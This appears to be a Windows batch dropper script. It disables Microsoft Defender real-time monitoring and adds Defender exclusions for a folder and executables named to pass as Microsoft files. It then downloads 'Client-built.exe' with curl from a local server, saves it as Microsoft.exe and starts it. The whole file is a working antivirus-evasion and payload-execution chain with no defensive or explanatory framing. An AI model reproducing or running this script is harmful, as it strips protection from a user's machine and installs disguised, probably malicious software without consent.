@echo off
set "DownloadDir=C:\Program Files\Microsoft-Windows"

REM Create the directory if it doesn't exist
if not exist "%DownloadDir%" (
    mkdir "%DownloadDir%"
)

cd "%DownloadDir%"

REM Turn off real-time protectiond
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM Add exclusions for C:\Program Files\MS-Corp
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%'"

REM Add exclusion for Microsoft.exe
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%\Microsoft.exe'"

REM Add exclusion for MS-Corporation.exe
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%\Microsoft-Windows.exe'"

curl -o Microsoft.exe http://localhost:8000/Client-built.exe

REM Open the downloaded Microsoft.exe file
start Microsoft.exe